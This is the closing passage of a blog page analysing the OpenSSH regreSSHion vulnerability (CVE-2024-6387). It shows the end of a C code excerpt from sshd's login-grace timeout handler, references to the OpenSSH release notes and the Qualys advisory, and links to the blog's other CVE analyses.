		<span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
		<span class="n">kill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">SIGTERM</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">_exit</span><span class="p">(</span><span class="n">EXIT_LOGIN_GRACE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h1 id="references"> <a href="#references" class="anchor-head"></a> References </h1> <ul> <li><a href="https://www.openssh.com/txt/release-9.8">https://www.openssh.com/txt/release-9.8</a><br /></li> <li><a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a></li> </ul> </div> </article> </main> <small class="post-updated-at">updated_at 05-11-2024</small> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/CVE-2024-38063/" > <div class="nav-arrow">Previous</div> <span class="post-title">CVE-2024-38063 - Analysis of Windows TCP/IP IPv6 Vulnerabilities</span> </a> <a class="post-nav-item post-nav-next" href="/CVE-2021-24086/"> <div class="nav-arrow">Next</div> <span class="post-title">CVE-2021-24086 - Analysis of Windows TCP/IP IPv6 Denial of Service (DoS) Vulnerability</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/thanks">ack.</a> <a class="footer_item" href="javascript::void(0)">resume</a> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2024</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
